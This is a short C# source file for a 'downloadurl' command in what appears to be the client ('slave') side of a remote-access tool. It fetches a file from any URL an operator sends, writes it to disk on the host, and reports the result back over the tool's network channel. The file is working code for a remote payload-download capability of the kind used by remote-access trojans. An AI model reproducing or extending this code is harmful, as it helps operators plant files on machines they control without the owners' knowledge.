using Shared;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using Slave.Core;

namespace Slave.Commands
{
    internal class DownloadUrl : ICommand
    {
        public string name { get; } = "downloadurl";

        public void Process(List<string> args)
        {
            var url = args[0];
            var newFile = url.Split('/').Last();

            try
            {
                using (var wc = new WebClient())
                {
                    wc.DownloadFile(url, newFile);
                }
                SlaveNetworkManager.GetInstance().WriteLine("Success");
            }
            catch (IOException)
            {
                SlaveNetworkManager.GetInstance().WriteLine("IO");
            }
            catch (Exception)
            {
                // Delete the partially created file
                File.Delete(newFile);
                SlaveNetworkManager.GetInstance().WriteLine("Web");
            }
        }
    }
}
